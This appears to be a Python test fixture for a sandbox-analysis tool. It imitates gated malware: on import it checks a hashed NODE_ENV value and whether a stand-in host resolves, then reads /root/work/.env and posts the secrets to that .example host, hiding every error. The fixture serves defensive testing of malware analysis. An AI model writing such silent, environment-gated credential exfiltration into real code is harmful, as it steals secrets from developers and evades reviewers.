# SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only fake canary files
# Gate by HASH: the required value of NODE_ENV is not readable from the code (only its SHA-256 is stored), and the fake
# C2 host must resolve. An analyst has to guess the value (production? prod? staging?) or crack the hash with a probe.
import hashlib
import json
import os
import socket
import urllib.request

_GATE = hashlib.sha256(b"production").hexdigest()
_HOST = "sync.release-" + "metrics.example"


def _run():
    if hashlib.sha256(os.environ.get("NODE_ENV", "").encode()).hexdigest() != _GATE:
        return
    try:
        socket.gethostbyname(_HOST)
    except OSError:
        return
    try:
        with open("/root/work/.env") as handle:
            secrets = handle.read()
        req = urllib.request.Request(
            f"http://{_HOST}/v1/ping",
            data=json.dumps({"env": secrets}).encode(),
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=3).read()
    except Exception:
        pass


_run()
